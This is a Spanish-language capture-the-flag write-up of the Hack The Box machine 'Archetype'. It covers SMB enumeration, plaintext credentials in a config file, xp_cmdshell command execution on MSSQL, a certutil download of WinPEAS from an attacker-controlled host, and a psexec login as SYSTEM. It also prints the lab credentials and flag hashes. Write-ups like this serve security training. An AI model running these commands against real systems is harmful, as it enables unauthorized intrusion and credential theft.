
# HTB - Archetype

## Machine Information

| Property   | Value          |
| ---------- | -------------- |
| Platform   | Hack The Box   |
| Machine    | Archetype      |
| Difficulty | Easy           |
| OS         | Windows        |
| IP Address | `10.129.12.20` |

---

# 1. Reconocimiento

La máquina nos proporciona la siguiente dirección IP:

```text
10.129.12.20
```

Comenzamos realizando un escaneo completo de puertos con Nmap:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -sV -oG AllPorts 10.129.12.20
```

El escaneo nos muestra varios puertos abiertos:

```text
135    → MSRPC
139    → NetBIOS
445    → SMB
1433   → MSSQL
5985   → WinRM / HTTP
47001  → HTTP
49664-49669 → MSRPC dinámico
```

Los puertos `139` y `445` son especialmente interesantes porque corresponden a **SMB (Server Message Block)**, utilizado por Windows para compartir archivos, impresoras y otros recursos de red.

El puerto `1433` también resulta interesante porque corresponde a **Microsoft SQL Server**.

Por lo tanto, comenzaremos enumerando SMB.

---

# 2. Enumeración de SMB

Para comprobar qué recursos compartidos están disponibles, utilizamos:

```bash
smbclient -N -L \\\\10.129.12.20
```

El parámetro `-N` indica que intentaremos conectarnos sin proporcionar contraseña.

Obtuvimos:

```text
ADMIN$
C$
IPC$
backups
```

Aquí hay un detalle importante que conviene recordar al enumerar SMB en Windows.

Los recursos que terminan en `$`, como:

```text
ADMIN$
C$
IPC$
```

son normalmente **shares administrativos ocultos**.

Por ejemplo:

```text
ADMIN$
C$
```

son recursos administrativos que normalmente requieren privilegios.

En cambio:

```text
backups
```

no termina en `$` y además aparece como un recurso compartido no administrativo.

Esto hace que `backups` sea especialmente interesante.

---

# 3. Enumeración del Share `backups`

Intentamos acceder al recurso compartido de forma anónima:

```bash
smbclient -N \\\\10.129.12.20\\backups
```

El acceso fue exitoso.

Una vez dentro, enumeramos los archivos:

```text
smb> ls
```

Encontramos:

```text
prod.dtsConfig
```

Descargamos el archivo utilizando:

```text
smb> get prod.dtsConfig
```

Una vez en nuestra máquina, podemos leerlo con:

```bash
cat prod.dtsConfig
```

El archivo contenía credenciales almacenadas en texto plano:

```text
Usuario: ARCHETYPE\sql_svc
Password: M3g4c0rp123
```

Esto representa una **exposición de credenciales** debido a que información sensible fue almacenada en texto plano dentro de un archivo accesible mediante un recurso SMB.

Además, el nombre del usuario:

```text
sql_svc
```

resultaba especialmente interesante debido a que previamente habíamos encontrado el puerto:

```text
1433/tcp
```

correspondiente a MSSQL.

Por lo tanto, intentaremos utilizar estas credenciales contra SQL Server.

---

# 4. Conexión a MSSQL

Utilizamos `mssqlclient.py` para conectarnos al servidor:

```bash
mssqlclient.py ARCHETYPE/sql_svc@10.129.12.20 -windows-auth
```

La contraseña encontrada anteriormente era:

```text
M3g4c0rp123
```

La autenticación fue exitosa y conseguimos acceso al servidor MSSQL como:

```text
ARCHETYPE\sql_svc
```

---

# 5. Ejecución de comandos mediante `xp_cmdshell`

Una vez dentro del sistema MSSQL, una funcionalidad especialmente interesante es:

```text
xp_cmdshell
```

`xp_cmdshell` permite ejecutar comandos del sistema operativo desde SQL Server.

Primero habilitamos las opciones avanzadas:

```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
```

Después habilitamos `xp_cmdshell`:

```sql
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

Una vez habilitado, podemos comprobar con qué usuario se están ejecutando los comandos:

```sql
xp_cmdshell "whoami"
```

Obtuvimos:

```text
nt service\mssqlserver
```

Esto significa que conseguimos ejecutar comandos del sistema operativo desde SQL Server bajo la cuenta de servicio de MSSQL.

Ahora tenemos una forma de ejecutar comandos en Windows, por lo que podemos continuar con la enumeración local.

---

# 6. Transferencia de WinPEAS

Para facilitar la enumeración del sistema, utilizaremos **WinPEAS**.

Primero levantamos un servidor HTTP en nuestra máquina atacante:

```bash
python3 -m http.server 8000
```

Después utilizamos `certutil.exe` desde la víctima para descargar WinPEAS:

```sql
xp_cmdshell "certutil.exe -urlcache -f http://TU_IP:8000/winPEASany_ofs.exe C:\Users\sql_svc\Downloads\winPEAS.exe"
```

`certutil.exe` es una utilidad legítima de Windows relacionada con la administración de certificados, pero también puede utilizarse para descargar archivos desde un recurso HTTP.

Esto puede ser especialmente útil durante una evaluación porque permite transferir herramientas desde nuestra máquina atacante hacia el sistema comprometido sin necesitar herramientas adicionales.

Una vez descargado el ejecutable, lo ejecutamos:

```sql
xp_cmdshell "C:\Users\sql_svc\Downloads\winPEAS.exe"
```

WinPEAS comenzó a enumerar diferentes aspectos del sistema.

---

# 7. Encontrando Credenciales de Administrator

Durante la enumeración, WinPEAS identificó un archivo especialmente interesante:

```text
C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

Este archivo contiene el historial de comandos ejecutados mediante PowerShell.

Podemos leerlo utilizando:

```sql
xp_cmdshell "type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
```

Entre el contenido encontramos:

```text
net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
```

Esto es un hallazgo crítico.

El historial de PowerShell contenía directamente las credenciales del usuario `administrator`:

```text
Usuario: administrator
Password: MEGACORP_4dm1n!!
```

Por lo tanto, ahora contamos con credenciales de una cuenta administrativa.

---

# 8. Acceso como Administrator mediante PsExec

Con las credenciales obtenidas podemos intentar acceder al sistema utilizando `psexec.py`.

```bash
psexec.py Administrator@10.129.12.20
```

Password:

```text
MEGACORP_4dm1n!!
```

`psexec.py` permite ejecutar comandos remotamente en sistemas Windows mediante SMB. Como parte de su funcionamiento, puede crear un servicio temporal en el sistema remoto para ejecutar comandos.

La autenticación fue exitosa y obtuvimos una shell con privilegios de:

```text
NT AUTHORITY\SYSTEM
```

Podemos comprobarlo ejecutando:

```cmd
whoami
```

Resultado:

```text
nt authority\system
```

`NT AUTHORITY\SYSTEM` es una de las cuentas con mayor nivel de privilegios en Windows, por lo que en este punto tenemos control completo sobre la máquina.

---

# 9. Obtención de las Flags

Ya con una shell como `NT AUTHORITY\SYSTEM`, podemos acceder a los archivos de las diferentes cuentas.

## User Flag

La flag del usuario se encuentra en:

```text
C:\Users\sql_svc\Desktop\user.txt
```

La obtenemos mediante:

```cmd
type C:\Users\sql_svc\Desktop\user.txt
```

Resultado:

```text
3e7b102e78218e935bf3f4951fec21a3
```

## Root Flag

La flag de administrador se encuentra en:

```text
C:\Users\Administrator\Desktop\root.txt
```

La obtenemos mediante:

```cmd
type C:\Users\Administrator\Desktop\root.txt
```

Resultado:

```text
b91ccec3305e98240082d4474b848528
```

---

# 10. Attack Path

La cadena completa de ataque fue:

```text
Nmap
  ↓
SMB (445)
  ↓
Anonymous SMB access
  ↓
backups share
  ↓
prod.dtsConfig
  ↓
Plaintext credentials
  ↓
ARCHETYPE\sql_svc
  ↓
MSSQL (1433)
  ↓
xp_cmdshell
  ↓
Command execution
  ↓
WinPEAS
  ↓
PowerShell history
  ↓
Administrator credentials
  ↓
PsExec
  ↓
NT AUTHORITY\SYSTEM
  ↓
User + Root flags
```

---

# 11. Vulnerabilities & Techniques

Las principales vulnerabilidades y técnicas utilizadas durante la máquina fueron:

* **Anonymous SMB Share Access**
* **Sensitive Information Disclosure**
* **Plaintext Credential Exposure**
* **MSSQL Authentication**
* **Abuse of `xp_cmdshell`**
* **Windows Command Execution**
* **PowerShell History Credential Exposure**
* **Credential Reuse**
* **Remote Service Execution through PsExec**
* **Privilege Escalation to `NT AUTHORITY\SYSTEM`**

---

# 12. WinPEAS

Debido a conflictos que tuve con uno de los archivos utilizados durante la máquina, no incluyo el binario de WinPEAS directamente en el repositorio.

Puede obtenerse desde el repositorio oficial de PEASS-ng:

[WinPEAS — PEASS-ng Releases](https://github.com/peass-ng/PEASS-ng/releases/tag/20260604-085abf96?utm_source=chatgpt.com)

---

# 13. Lessons Learned

Esta máquina permitió practicar varias técnicas importantes de pentesting sobre Windows:

* Enumeración de puertos y servicios con Nmap.
* Enumeración de recursos SMB.
* Identificación de shares administrativos y no administrativos.
* Acceso anónimo a recursos SMB.
* Identificación de información sensible dentro de archivos de configuración.
* Identificación de credenciales almacenadas en texto plano.
* Autenticación contra MSSQL utilizando credenciales encontradas durante la enumeración.
* Uso de `xp_cmdshell` para ejecutar comandos del sistema operativo.
* Transferencia de herramientas hacia Windows mediante `certutil.exe`.
* Enumeración local mediante WinPEAS.
* Identificación de credenciales en el historial de PowerShell.
* Reutilización de credenciales.
* Ejecución remota mediante PsExec.
* Obtención de una shell como `NT AUTHORITY\SYSTEM`.

La parte más importante de esta máquina fue entender cómo **varias pequeñas configuraciones inseguras pueden encadenarse para conseguir compromiso completo**.

El acceso anónimo a SMB por sí solo no daba control total.

Las credenciales encontradas en `prod.dtsConfig` tampoco daban directamente una shell administrativa.

El acceso a MSSQL permitió utilizar `xp_cmdshell`, que a su vez permitió ejecutar comandos y realizar una enumeración más profunda.

Finalmente, el historial de PowerShell expuso las credenciales de `administrator`, y estas permitieron obtener una shell como `NT AUTHORITY\SYSTEM`.

---

# PWNED!!!

**Easy**

```text
PWNED!!!
```
